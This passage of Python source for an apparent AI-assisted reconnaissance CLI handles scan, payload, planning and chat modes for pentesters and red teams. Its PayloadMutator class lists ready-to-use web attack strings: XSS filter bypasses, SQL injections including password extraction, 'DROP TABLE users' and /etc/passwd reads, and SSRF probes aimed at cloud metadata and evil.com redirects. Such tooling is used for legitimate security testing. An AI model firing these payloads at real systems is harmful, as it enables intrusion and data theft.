            vuln_scan, scan_type, persona, integration
        )

        if "error" in scan_results:
            click.secho(f"❌ {scan_results['error']}", fg="red")
            return

        click.secho("\n🔍 AI-Powered Vulnerability Scan Results", fg="red", bold=True)
        click.secho(f"Source: {vuln_scan}", fg="blue")
        click.secho(f"Scan Type: {scan_type.upper()}", fg="blue")
        click.secho(
            f"Endpoints: {scan_results['endpoint_metadata']['total_endpoints']}",
            fg="blue",
        )

        if persona:
            click.secho(f"Persona: {persona.upper()}", fg="magenta")

        # Display risk assessment
        risk_assessment = scan_results["risk_assessment"]
        click.secho("\n📊 Risk Assessment:", fg="yellow", bold=True)
        click.secho(
            f"  Composite Score: {risk_assessment['composite_score']}/10", fg="white"
        )
        click.secho(
            f"  Risk Level: {risk_assessment['risk_level']}",
            fg="red" if risk_assessment["risk_level"] == "CRITICAL" else "yellow",
        )
        click.secho(
            f"  Recommendation: {risk_assessment['recommendation']}", fg="white"
        )

        # Display integration insights
        insights = scan_results["integration_insights"]
        if insights and verbose:
            click.secho("\n🔗 ReconCLI Integration Insights:", fg="cyan", bold=True)
            for insight in insights[:5]:
                click.secho(f"  • {insight}", fg="green")

        # Display vulnerability tests
        vuln_tests = scan_results["vulnerability_tests"]
        if verbose and vuln_tests:
            click.secho("\n🎯 Vulnerability Test Categories:", fg="magenta", bold=True)
            for test_type, test_data in vuln_tests.items():
                click.secho(
                    f"  {test_type.upper()}: {test_data.get('description', 'N/A')}",
                    fg="white",
                )

        # Display AI analysis
        click.secho(
            f"\n🧠 AI Vulnerability Analysis:\n{scan_results['ai_analysis']}",
            fg="green",
        )

        # Display recommendations
        recommendations = scan_results["recommended_actions"]
        if recommendations:
            click.secho("\n💡 Security Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(recommendations[:10], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Display compliance mapping
        compliance = scan_results["compliance_mapping"]
        if verbose and compliance:
            click.secho("\n⚖️  Compliance Framework Mapping:", fg="blue", bold=True)
            for framework, requirements in compliance.items():
                if requirements:
                    click.secho(
                        f"  {framework.upper()}: {', '.join(requirements[:3])}",
                        fg="white",
                    )

        # Save scan results to file
        scan_filename = f"vuln_scan_{scan_type}_{int(time.time())}.json"
        with open(scan_filename, "w") as f:
            json.dump(scan_results, f, indent=2)

        if verbose:
            click.secho(
                f"💾 Vulnerability scan results saved to: {scan_filename}", fg="green"
            )

        # Generate detailed vulnerability report
        if scan_type in ["comprehensive", "deep", "compliance"]:
            report_filename = f"vuln_report_{scan_type}_{int(time.time())}.md"
            markdown_content = f"""# AI-Powered Vulnerability Assessment Report

**Generated:** {scan_results['scan_metadata']['timestamp']}  
**Source:** {vuln_scan}  
**Scan Type:** {scan_type.upper()}  
**Persona:** {persona or 'default'}  

## Executive Summary

### Risk Assessment
- **Composite Score:** {risk_assessment['composite_score']}/10
- **Risk Level:** {risk_assessment['risk_level']}
- **Endpoints Scanned:** {scan_results['endpoint_metadata']['total_endpoints']}

### Recommendation
{risk_assessment['recommendation']}

## Technical Analysis

{scan_results['ai_analysis']}

## Integration Insights

{chr(10).join(f"- {insight}" for insight in insights[:10])}

## Security Recommendations

{chr(10).join(f"{i}. {rec}" for i, rec in enumerate(recommendations[:15], 1))}

## Compliance Mapping

{chr(10).join(f"### {framework.upper()}" + chr(10) + chr(10).join(f"- {req}" for req in reqs) for framework, reqs in compliance.items() if reqs)}

---
*Report generated by ReconCLI AI Vulnerability Scanner*
"""

            with open(report_filename, "w") as f:
                f.write(markdown_content)

            click.secho(
                f"📄 Detailed vulnerability report saved to: {report_filename}",
                fg="green",
            )

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Interactive mode
    if interactive:
        click.secho("\n🤖 Interactive AI Assistant Mode", fg="cyan", bold=True)
        click.secho("Type 'quit' or 'exit' to leave, 'help' for commands", fg="yellow")

        while True:
            try:
                user_input = click.prompt("\n💬 You", type=str, default="")
            except click.Abort:
                break

            if user_input.lower() in ["quit", "exit"]:
                break
            elif user_input.lower() == "help":
                click.secho(
                    """
Available commands:
- Any recon question or request
- 'payload <type>' - Generate payload
- 'plan <domain>' - Create recon plan  
- 'analyze <domain>' - Analyze target
- 'session info' - Show session details
- 'providers' - List AI providers
""",
                    fg="blue",
                )
                continue
            elif user_input.lower() == "providers":
                click.secho(
                    f"Available: {', '.join(ai_assistant.get_available_providers())}",
                    fg="green",
                )
                continue
            elif user_input.lower() == "session info" and ai_assistant.current_session:
                click.secho(
                    f"Session: {ai_assistant.current_session.session_id}", fg="blue"
                )
                click.secho(f"Target: {ai_assistant.current_session.target}", fg="blue")
                click.secho(
                    f"Queries: {len(ai_assistant.current_session.queries)}", fg="blue"
                )
                continue

            # Process AI request
            response = ai_assistant.ask_ai(
                user_input, provider=provider, persona=persona
            )
            if response:
                click.secho(f"\n🧠 AI Assistant:\n{response}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

        return

    # Generate payload
    if payload:
        if verbose:
            click.secho(f"[*] Generating {payload.upper()} payload...", fg="cyan")

        payload_data = ai_assistant.generate_payload(
            payload, context, technique, persona
        )

        if "error" in payload_data:
            click.secho(f"❌ {payload_data['error']}", fg="red")
            return

        click.secho(f"\n🎯 {payload.upper()} Payload Generation", fg="cyan", bold=True)
        click.secho(f"Context: {context or 'general'}", fg="blue")
        click.secho(f"Technique: {technique or 'all'}", fg="blue")

        # Advanced Payload Mutation Engine integration
        if mutate and payload in ["xss", "sqli", "ssrf"]:
            click.secho("\n🔬 Advanced Payload Mutations:", fg="magenta", bold=True)
            mutator = PayloadMutator(context=context or "html", technique=payload)
            mutations_list = mutator.mutate()

            # Limit mutations if requested
            if mutations < len(mutations_list):
                mutations_list = mutations_list[:mutations]

            click.secho(
                f"Generated {len(mutations_list)} mutation variants:", fg="yellow"
            )
            for i, mutation in enumerate(mutations_list, 1):
                click.secho(f"{i:2d}. {mutation}", fg="white")

            # Add mutations to payload data
            payload_data["mutations"] = {
                "count": len(mutations_list),
                "technique": payload,
                "context": context or "html",
                "variants": mutations_list,
            }

        click.secho(f"\n{payload_data['payloads']}", fg="white")

        # Save to file
        payload_file = f"{payload}_{context or 'general'}_{int(time.time())}.json"
        with open(payload_file, "w") as f:
            json.dump(payload_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Payload data saved to: {payload_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Generate reconnaissance plan
    elif plan:
        if verbose:
            click.secho(f"[*] Generating recon plan for {plan}...", fg="cyan")

        # Create session if not exists
        if not ai_assistant.current_session:
            ai_assistant.create_session(plan)

        plan_data = ai_assistant.generate_recon_plan(plan, scope, persona)

        click.secho(f"\n🎯 Reconnaissance Plan: {plan}", fg="cyan", bold=True)
        click.secho(f"Scope: {scope}", fg="blue")
        click.secho(f"Phases: {len(plan_data['phases'])}", fg="blue")

        for i, phase in enumerate(plan_data["phases"], 1):
            click.secho(f"\n📋 Phase {i}: {phase['name']}", fg="yellow", bold=True)
            click.secho(f"Description: {phase['description']}", fg="white")
            click.secho(f"Tools: {', '.join(phase['tools'])}", fg="green")
            click.secho(f"Estimated time: {phase['estimated_time']}", fg="blue")

            if verbose:
                click.secho("Commands:", fg="cyan")
                for cmd in phase["commands"]:
                    click.secho(f"  {cmd}", fg="white")

        if plan_data.get("ai_recommendations"):
            click.secho(
                f"\n🧠 AI Recommendations:\n{plan_data['ai_recommendations']}",
                fg="green",
            )

        # Export plan if requested
        if export_plan:
            with open(export_plan, "w") as f:
                json.dump(plan_data, f, indent=2)

            click.secho(f"💾 Plan exported to: {export_plan}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Analyze target
    elif analyze:
        if verbose:
            click.secho(f"[*] Analyzing target {analyze}...", fg="cyan")

        analysis_data = ai_assistant.analyze_target(analyze, persona)

        click.secho(f"\n🔍 Target Analysis: {analyze}", fg="cyan", bold=True)
        click.secho(f"{analysis_data['analysis']}", fg="white")

        if analysis_data["recommendations"]:
            click.secho("\n💡 Key Recommendations:", fg="yellow", bold=True)
            for i, rec in enumerate(analysis_data["recommendations"], 1):
                click.secho(f"{i}. {rec}", fg="green")

        # Save analysis
        analysis_file = f"analysis_{analyze.replace('.', '_')}_{int(time.time())}.json"
        with open(analysis_file, "w") as f:
            json.dump(analysis_data, f, indent=2)

        if verbose:
            click.secho(f"💾 Analysis saved to: {analysis_file}", fg="green")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # Direct prompt
    elif prompt:
        if verbose:
            click.secho("[*] Processing prompt...", fg="cyan")

        response = ai_assistant.ask_ai(prompt, provider=provider, persona=persona)

        if response:
            click.secho(f"\n🧠 AI Assistant:\n{response}", fg="green")
        else:
            click.secho("❌ No response from AI", fg="red")

        # Save chat if requested
        if save_chat:
            if ai_assistant.save_chat_history(save_chat):
                click.secho(f"💾 Chat saved to: {save_chat}", fg="green")
            else:
                click.secho(f"❌ Failed to save chat: {save_chat}", fg="red")

    # List available sessions
    if list_sessions:
        sessions = list(ai_assistant.session_dir.glob("*.json"))
        if sessions:
            click.secho("\n📁 Available Sessions:", fg="cyan", bold=True)
            for session_file in sessions:
                try:
                    with open(session_file, "r") as f:
                        session_data = json.load(f)
                    click.secho(
                        f"  {session_data['session_id']}: {session_data['target']} "
                        f"({session_data['start_time'][:19]})",
                        fg="white",
                    )
                except Exception:
                    continue
        else:
            click.secho("No sessions found.", fg="yellow")
        return

    # Show usage if no options provided
    else:
        click.secho("🧠 AI-Powered Reconnaissance Assistant", fg="cyan", bold=True)
        click.secho("Use --help for detailed usage or try:", fg="yellow")
        click.secho("  --prompt 'How to enumerate subdomains effectively?'", fg="white")
        click.secho("  --payload xss --context html --persona bugbounty", fg="white")
        click.secho(
            "  --plan example.com --scope comprehensive --persona redteam", fg="white"
        )
        click.secho("  --analyze example.com --persona pentester", fg="white")
        click.secho(
            "  --attack-flow ssrf,xss,lfi --technique gopher --persona redteam",
            fg="white",
        )
        click.secho(
            "  --report attack_flow_file.json --persona pentester",
            fg="white",
        )
        click.secho(
            "  --interactive --persona trainer --save-chat training_session", fg="white"
        )
        click.secho("  --load-chat previous_session --interactive", fg="white")

        click.secho("\n⚔️  Advanced Attack Flows:", fg="red", bold=True)
        click.secho("  --attack-flow ssrf,xss      # SSRF → XSS chain", fg="red")
        click.secho(
            "  --attack-flow sqli,lfi,xss  # SQL → LFI → XSS escalation", fg="red"
        )
        click.secho(
            "  --attack-flow ssti,lfi      # SSTI → LFI privilege escalation", fg="red"
        )

        click.secho("\n📊 Report Generation:", fg="blue", bold=True)
        click.secho(
            "  --report flow.json --persona pentester   # Professional report",
            fg="blue",
        )
        click.secho(
            "  --report flow.json --persona redteam     # Tactical assessment",
            fg="blue",
        )
        click.secho(
            "  --report flow.json --persona bugbounty   # Bug bounty impact", fg="blue"
        )

        click.secho("\n🔧 Advanced Techniques:", fg="cyan", bold=True)
        click.secho(
            "  --technique gopher          # SSRF with Gopher protocol", fg="cyan"
        )
        click.secho(
            "  --technique reflection      # Reflected XSS variations", fg="cyan"
        )
        click.secho(
            "  --technique union           # SQL injection UNION attacks", fg="cyan"
        )
        click.secho("  --technique wrapper         # LFI with PHP wrappers", fg="cyan")

        click.secho("\n🔬 Advanced Payload Mutation Engine:", fg="magenta", bold=True)
        click.secho(
            "  --payload xss --mutate --mutations 20      # XSS WAF bypass mutations",
            fg="magenta",
        )
        click.secho(
            "  --payload sqli --mutate --mutations 15     # SQL injection variants",
            fg="magenta",
        )
        click.secho(
            "  --payload ssrf --mutate --context cloud   # SSRF protocol mutations",
            fg="magenta",
        )

        click.secho("\n🔍 AI-Powered Vulnerability Scanner:", fg="red", bold=True)
        click.secho(
            "  --vuln-scan endpoints.txt --scan-type quick --persona bugbounty",
            fg="red",
        )
        click.secho(
            "  --vuln-scan urlcli_output.json --scan-type comprehensive --integration",
            fg="red",
        )
        click.secho(
            "  --vuln-scan discovered_urls.txt --scan-type compliance --persona pentester",
            fg="red",
        )
        click.secho(
            "  --vuln-scan httpcli_results.json --scan-type deep --persona redteam",
            fg="red",
        )

        click.secho("\n📋 Scan Types:", fg="magenta", bold=True)
        click.secho("  quick          - Fast common vulnerability scan", fg="white")
        click.secho("  comprehensive  - Complete vulnerability assessment", fg="white")
        click.secho("  focused        - Technology-specific testing", fg="white")
        click.secho("  deep           - Advanced threat simulation", fg="white")
        click.secho("  compliance     - OWASP Top 10, PCI DSS, GDPR", fg="white")

        click.secho("\n🎭 Available Personas:", fg="cyan", bold=True)
        click.secho("  redteam    - Stealth operations & evasion techniques", fg="red")
        click.secho(
            "  bugbounty  - Quick wins & high-impact vulnerabilities", fg="yellow"
        )
        click.secho(
            "  pentester  - Professional methodology & documentation", fg="blue"
        )
        click.secho(
            "  trainer    - Educational & step-by-step explanations", fg="green"
        )
        click.secho(
            "  osint      - Passive intelligence & public sources", fg="magenta"
        )

        if ai_assistant.get_available_providers():
            click.secho(
                f"\n✅ Available AI providers: {', '.join(ai_assistant.get_available_providers())}",
                fg="green",
            )
        else:
            click.secho("\n❌ No AI providers configured. Set your API keys:", fg="red")
            click.secho("  export OPENAI_API_KEY='your-key'", fg="white")
            click.secho("  export ANTHROPIC_API_KEY='your-key'", fg="white")
            click.secho("  export GOOGLE_API_KEY='your-key'", fg="white")


# === Payload Mutation Engine ===


class PayloadMutator:
    def __init__(self, context="html", technique="xss"):
        self.context = context.lower()
        self.technique = technique.lower()

    def mutate(self):
        if self.technique == "xss":
            return self._mutate_xss()
        elif self.technique == "sqli":
            return self._mutate_sqli()
        elif self.technique == "ssrf":
            return self._mutate_ssrf()
        else:
            return []

    def _mutate_xss(self):
        base = "<script>alert(1)</script>"
        return [
            base,
            base.replace("alert", "al\u0065rt"),
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
            "<svg onload=alert(1)>",
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<input onfocus=alert(1) autofocus>",
        ]

    def _mutate_sqli(self):
        return [
            # Basic authentication bypasses
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 1=1#",
            "' OR '1'='1' /*",
            "' OR '1'='1'--",
            "' OR '1'='1' -- -",
            # Comment manipulation
            "'--",
            "';--",
            "'/*",
            "' OR '' = '",
            "' OR ''='",
            # Time-based (MySQL)
            "' OR sleep(5)--",
            "'; WAITFOR DELAY '00:00:05'--",  # MSSQL
            # Union injections
            "' UNION SELECT null, null--",
            "' UNION SELECT null, version()--",
            "' UNION SELECT username, password FROM users--",
            "' AND 1=0 UNION ALL SELECT NULL, NULL--",
            # Stack queries (if supported)
            "'; DROP TABLE users; --",
            "'; SELECT pg_sleep(5); --",
            # File reading / OS interaction (PostgreSQL / MySQL)
            "'||(SELECT load_file('/etc/passwd'))||'",
            "' OR 1=1; --",
            "' OR EXISTS(SELECT * FROM users)--",
            # Encoding / obfuscation
            "%27%20OR%20%271%27%3D%271",
            "'+OR+1=1--",
            # JSON-based injections
            '{"$ne": null}',
            "' OR JSON_EXTRACT(data, '$.password') = 'admin' --",
            # WAF bypass attempts
            "' OR 1=1 LIMIT 1 OFFSET 0 --",
            "'/**/OR/**/'1'='1",
            "' OR 1=1--+",
            "' OR '1'='1'--+",
        ]

    def _mutate_ssrf(self):
        return [
            "http://127.0.0.1",
            "http://localhost:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::]:80/",
            "http://127.1/redirect?url=http://evil.com",
            "http://127.0.0.1@evil.com",
            "http://evil.com#@127.0.0.1",
            "http://example.com%09@127.0.0.1",
            "gopher://127.0.0.1:80/_GET / HTTP/1.0",
            "http://localhost/admin",
        ]


# === Optional standalone test ===
if __name__ == "__main__":
    mutator = PayloadMutator(context="html", technique="xss")
    print("[+] Payload Mutations for XSS:")
    for p in mutator.mutate():
        print("-", p)
